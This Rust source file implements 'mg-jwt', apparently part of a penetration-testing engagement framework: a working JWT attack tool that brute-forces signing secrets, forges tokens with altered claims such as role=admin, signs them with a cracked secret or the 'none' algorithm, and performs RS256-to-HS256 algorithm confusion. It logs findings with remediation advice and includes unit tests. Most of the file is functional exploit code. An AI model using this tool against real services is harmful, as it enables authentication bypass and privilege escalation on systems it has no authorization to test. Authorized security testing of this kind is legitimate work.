/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-jwt — JWT attack toolkit: decode, brute-force secret,
 *                  claim manipulation, RS256→HS256 algorithm confusion.
 * Notes:           No JWT library used; HMAC-SHA256 implemented directly via
 *                  the hmac + sha2 crates. Signing: HMAC-SHA256(b64url(hdr)
 *                  + "." + b64url(payload), secret). Results written as
 *                  pretty JSON to engagements/<name>/jwt/results-<ts>.json.
 *******************************************************************/

use std::collections::HashMap;
use std::fs;
use std::io::{self, BufRead, Read};
use std::path::Path;

use anyhow::{Context, Result, bail};
use base64::{Engine, engine::general_purpose::URL_SAFE_NO_PAD};
use clap::Parser;
use hmac::{Hmac, Mac};
use serde::Serialize;
use sha2::Sha256;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "jwt";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-jwt";
const NONE_ALG: &str = "none";
const HS256_ALG: &str = "HS256";

// Built-in short wordlist for brute-force when no --wordlist given
const BUILTIN_SECRETS: &[&str] = &[
    "secret", "password", "12345", "jwt_secret", "changeme",
    "dev", "test", "admin", "key", "tok",
];

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-jwt",
    about = "JWT attack toolkit — decode, brute-force, claim manipulation, alg confusion"
)]
struct Args {
    /// Engagement name
    engagement: String,

    /// JWT token string (reads from stdin if not provided)
    #[arg(long)]
    token: Option<String>,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Wordlist file for brute-force (one secret per line)
    #[arg(long)]
    wordlist: Option<String>,

    /// Override a claim in the payload: key=value (repeatable)
    #[arg(long = "claim")]
    claims: Vec<String>,

    /// Attempt RS256→HS256 algorithm confusion (requires --pubkey)
    #[arg(long)]
    alg_confusion: bool,

    /// Public key PEM file path for algorithm confusion attack
    #[arg(long)]
    pubkey: Option<String>,

    /// Brute-force the signing secret
    #[arg(long)]
    brute: bool,
}

// ── Output types ─────────────────────────────────────────────────────────────

// Full result written to disk
#[derive(Serialize)]
struct JwtResults {
    engagement: String,
    original_header: serde_json::Value,
    original_payload: serde_json::Value,
    signature_b64url: String,
    found_secret: Option<String>,
    forged_tokens: Vec<ForgedToken>,
    timestamp: String,
}

// One forged token and its description
#[derive(Serialize)]
struct ForgedToken {
    description: String,
    token: String,
}

// ── JWT primitives ────────────────────────────────────────────────────────────

// Split and base64url-decode all three JWT parts
fn decode_jwt(token: &str) -> Result<(serde_json::Value, serde_json::Value, String)> {
    let parts: Vec<&str> = token.splitn(3, '.').collect();
    if parts.len() != 3 {
        bail!("invalid JWT: expected 3 dot-separated parts, got {}", parts.len());
    }
    let header_raw = URL_SAFE_NO_PAD
        .decode(parts[0])
        .context("base64url-decode JWT header")?;
    let payload_raw = URL_SAFE_NO_PAD
        .decode(parts[1])
        .context("base64url-decode JWT payload")?;
    let header: serde_json::Value = serde_json::from_slice(&header_raw).context("parse JWT header JSON")?;
    let payload: serde_json::Value = serde_json::from_slice(&payload_raw).context("parse JWT payload JSON")?;
    Ok((header, payload, parts[2].to_string()))
}

// Encode a header+payload map into base64url(json)
fn encode_part(value: &serde_json::Value) -> Result<String> {
    let json = serde_json::to_string(value).context("serialize JWT part")?;
    Ok(URL_SAFE_NO_PAD.encode(json.as_bytes()))
}

// Compute HMAC-SHA256 signature over "header_b64.payload_b64" with given secret bytes
fn hmac_sha256_sign(header_b64: &str, payload_b64: &str, secret: &[u8]) -> String {
    let msg = format!("{header_b64}.{payload_b64}");
    let mut mac = Hmac::<Sha256>::new_from_slice(secret)
        .expect("HMAC accepts any key length");
    mac.update(msg.as_bytes());
    let result = mac.finalize().into_bytes();
    URL_SAFE_NO_PAD.encode(result)
}

// Verify a candidate secret against the token's existing signature
fn verify_secret(header_b64: &str, payload_b64: &str, sig_b64: &str, candidate: &str) -> bool {
    let computed = hmac_sha256_sign(header_b64, payload_b64, candidate.as_bytes());
    computed == sig_b64
}

// Build a complete token string: base64url(header).base64url(payload).signature
fn build_token(header: &serde_json::Value, payload: &serde_json::Value, secret: Option<&[u8]>) -> Result<String> {
    let h = encode_part(header)?;
    let p = encode_part(payload)?;
    let sig = match secret {
        Some(key) => hmac_sha256_sign(&h, &p, key),
        None => String::new(), // "none" algorithm: empty signature
    };
    Ok(format!("{h}.{p}.{sig}"))
}

// ── Attack phases ─────────────────────────────────────────────────────────────

// Try each candidate secret; return the first match
fn brute_force(
    header_b64: &str,
    payload_b64: &str,
    sig_b64: &str,
    candidates: impl Iterator<Item = String>,
) -> Option<String> {
    for candidate in candidates {
        let candidate = candidate.trim().to_string();
        if candidate.is_empty() {
            continue;
        }
        if verify_secret(header_b64, payload_b64, sig_b64, &candidate) {
            return Some(candidate);
        }
    }
    None
}

// Apply claim overrides from --claim key=value flags
fn apply_claim_overrides(
    payload: &serde_json::Value,
    overrides: &[String],
) -> Result<serde_json::Value> {
    let mut map: HashMap<String, serde_json::Value> = serde_json::from_value(payload.clone())
        .context("payload must be a JSON object")?;
    for kv in overrides {
        let (k, v) = kv.split_once('=')
            .with_context(|| format!("--claim {kv:?} must be key=value"))?;
        // Try to parse value as JSON first; fall back to string
        let parsed: serde_json::Value = serde_json::from_str(v)
            .unwrap_or_else(|_| serde_json::Value::String(v.to_string()));
        map.insert(k.to_string(), parsed);
    }
    Ok(serde_json::to_value(map)?)
}

// Perform RS256→HS256 algorithm confusion using public key bytes as HMAC secret
fn alg_confusion_attack(
    header: &serde_json::Value,
    payload: &serde_json::Value,
    pubkey_path: &str,
) -> Result<ForgedToken> {
    let pem_bytes = fs::read(pubkey_path)
        .with_context(|| format!("read public key PEM: {pubkey_path}"))?;
    let mut forged_header = header.clone();
    forged_header["alg"] = serde_json::Value::String(HS256_ALG.to_string());
    // Remove kid to reduce server-side key lookup friction
    if let Some(obj) = forged_header.as_object_mut() {
        obj.remove("kid");
    }
    let h = encode_part(&forged_header)?;
    let p = encode_part(payload)?;
    let sig = hmac_sha256_sign(&h, &p, &pem_bytes);
    let token = format!("{h}.{p}.{sig}");
    Ok(ForgedToken {
        description: "RS256→HS256 algorithm confusion (public key as HMAC secret)".into(),
        token,
    })
}

// ── Entry point ───────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    // Read token from --token flag or stdin
    let raw_token = match &args.token {
        Some(t) => t.clone(),
        None => {
            let mut buf = String::new();
            io::stdin().lock().read_to_string(&mut buf).context("read token from stdin")?;
            buf.trim().to_string()
        }
    };

    // Split token into its three raw parts for signature verification
    let parts: Vec<&str> = raw_token.splitn(3, '.').collect();
    if parts.len() != 3 {
        bail!("invalid JWT: expected 3 dot-separated parts");
    }
    let (header_b64, payload_b64, sig_b64) = (parts[0], parts[1], parts[2]);

    // Decode and display original token
    let (header, payload, _sig) = decode_jwt(&raw_token)?;
    println!("=== Header ===");
    println!("{}", serde_json::to_string_pretty(&header)?);
    println!("=== Payload ===");
    println!("{}", serde_json::to_string_pretty(&payload)?);
    println!("=== Signature (b64url) ===");
    println!("{sig_b64}");

    let mut found_secret: Option<String> = None;
    let mut forged_tokens: Vec<ForgedToken> = Vec::new();

    // Brute-force phase
    if args.brute {
        println!("\n[*] Brute-forcing secret...");
        let secret = if let Some(wl_path) = &args.wordlist {
            let file = fs::File::open(wl_path)
                .with_context(|| format!("open wordlist: {wl_path}"))?;
            let lines = io::BufReader::new(file).lines()
                .map_while(|l| l.ok());
            brute_force(header_b64, payload_b64, sig_b64, lines)
        } else {
            brute_force(
                header_b64,
                payload_b64,
                sig_b64,
                BUILTIN_SECRETS.iter().map(|s| s.to_string()),
            )
        };
        match &secret {
            Some(s) => println!("[+] Secret found: {s}"),
            None => println!("[-] Secret not found"),
        }
        found_secret = secret;
    }

    // Claim manipulation phase
    if !args.claims.is_empty() {
        let modified_payload = apply_claim_overrides(&payload, &args.claims)?;
        // Sign with found secret if available, else use "none" algorithm
        let (sign_key, alg_label): (Option<&[u8]>, &str) = match &found_secret {
            Some(s) => (Some(s.as_bytes()), HS256_ALG),
            None => (None, NONE_ALG),
        };
        let mut forged_header = header.clone();
        forged_header["alg"] = serde_json::Value::String(alg_label.to_string());
        let token = build_token(&forged_header, &modified_payload, sign_key)?;
        println!("\n[+] Forged token (modified claims, alg={alg_label}):\n{token}");
        forged_tokens.push(ForgedToken {
            description: format!("claim manipulation alg={alg_label} claims={}", args.claims.join(",")),
            token,
        });
    }

    // Algorithm confusion phase
    if args.alg_confusion {
        let original_alg = header["alg"].as_str().unwrap_or("");
        if original_alg != "RS256" {
            eprintln!("[!] --alg-confusion: header alg is {original_alg:?}, expected RS256 — continuing anyway");
        }
        let pubkey_path = args.pubkey.as_deref()
            .context("--alg-confusion requires --pubkey <path>")?;
        let forged = alg_confusion_attack(&header, &payload, pubkey_path)?;
        println!("\n[+] Alg-confusion token:\n{}", forged.token);
        forged_tokens.push(forged);
    }

    // Write output JSON to engagement jwt/ subdir
    let jwt_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&jwt_dir).context("create jwt output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = jwt_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let results = JwtResults {
        engagement: args.engagement.clone(),
        original_header: header,
        original_payload: payload,
        signature_b64url: sig_b64.to_string(),
        found_secret: found_secret.clone(),
        forged_tokens,
        timestamp: ts,
    };
    let json = serde_json::to_string_pretty(&results)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("\n[*] Results written to {}", out_path.display());

    // Write finding when secret is brute-forced
    if let Some(ref s) = found_secret {
        let tf = ToolFinding::new("mg-jwt", "JWT Secret Brute-Forced", FindingSeverity::High)
            .evidence(format!("secret={s}"))
            .recommendation("Rotate the JWT secret immediately; use a cryptographically random value of at least 256 bits");
        let _ = write_finding(&eng, &tf);
    }

    // Write finding when algorithm confusion token is forged
    if args.alg_confusion {
        let tf = ToolFinding::new("mg-jwt", "JWT Algorithm Confusion (RS256→HS256)", FindingSeverity::High)
            .evidence("Public key accepted as HMAC secret — forged token produced")
            .recommendation("Verify the algorithm header server-side; reject HS256 on RS256-only endpoints");
        let _ = write_finding(&eng, &tf);
    }

    // Record audit log entry
    let detail = format!(
        "brute={} claims={} alg_confusion={} secret_found={}",
        args.brute,
        args.claims.len(),
        args.alg_confusion,
        found_secret.is_some()
    );
    let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // Build a real HMAC-SHA256 signed JWT for test input
    fn make_signed_token(secret: &str) -> String {
        let header = serde_json::json!({"alg": "HS256", "typ": "JWT"});
        let payload = serde_json::json!({"sub": "1234", "role": "user"});
        let h = URL_SAFE_NO_PAD.encode(serde_json::to_string(&header).unwrap().as_bytes());
        let p = URL_SAFE_NO_PAD.encode(serde_json::to_string(&payload).unwrap().as_bytes());
        let sig = hmac_sha256_sign(&h, &p, secret.as_bytes());
        format!("{h}.{p}.{sig}")
    }

    #[test]
    fn decode_round_trips_header_and_payload() {
        let token = make_signed_token("testsecret");
        let (header, payload, sig) = decode_jwt(&token).unwrap();
        assert_eq!(header["alg"], "HS256");
        assert_eq!(payload["sub"], "1234");
        assert!(!sig.is_empty());
    }

    #[test]
    fn brute_force_finds_known_secret() {
        let token = make_signed_token("secret");
        let parts: Vec<&str> = token.splitn(3, '.').collect();
        let found = brute_force(
            parts[0],
            parts[1],
            parts[2],
            BUILTIN_SECRETS.iter().map(|s| s.to_string()),
        );
        assert_eq!(found.as_deref(), Some("secret"));
    }

    #[test]
    fn brute_force_returns_none_for_unknown_secret() {
        let token = make_signed_token("totally-unknown-secret-xyz");
        let parts: Vec<&str> = token.splitn(3, '.').collect();
        let found = brute_force(
            parts[0],
            parts[1],
            parts[2],
            BUILTIN_SECRETS.iter().map(|s| s.to_string()),
        );
        assert!(found.is_none());
    }

    #[test]
    fn apply_claim_overrides_replaces_and_adds_fields() {
        let payload = serde_json::json!({"sub": "1", "role": "user"});
        let overrides = vec!["role=admin".to_string(), "exp=9999999999".to_string()];
        let modified = apply_claim_overrides(&payload, &overrides).unwrap();
        assert_eq!(modified["role"], "admin");
        assert_eq!(modified["exp"], 9_999_999_999_u64);
        assert_eq!(modified["sub"], "1");
    }

    #[test]
    fn verify_secret_detects_correct_and_wrong() {
        let token = make_signed_token("mysecret");
        let parts: Vec<&str> = token.splitn(3, '.').collect();
        assert!(verify_secret(parts[0], parts[1], parts[2], "mysecret"));
        assert!(!verify_secret(parts[0], parts[1], parts[2], "wrongsecret"));
    }

    #[test]
    fn build_token_none_alg_produces_empty_sig() {
        let header = serde_json::json!({"alg": "none", "typ": "JWT"});
        let payload = serde_json::json!({"sub": "test"});
        let token = build_token(&header, &payload, None).unwrap();
        assert!(token.ends_with('.'));
    }
}
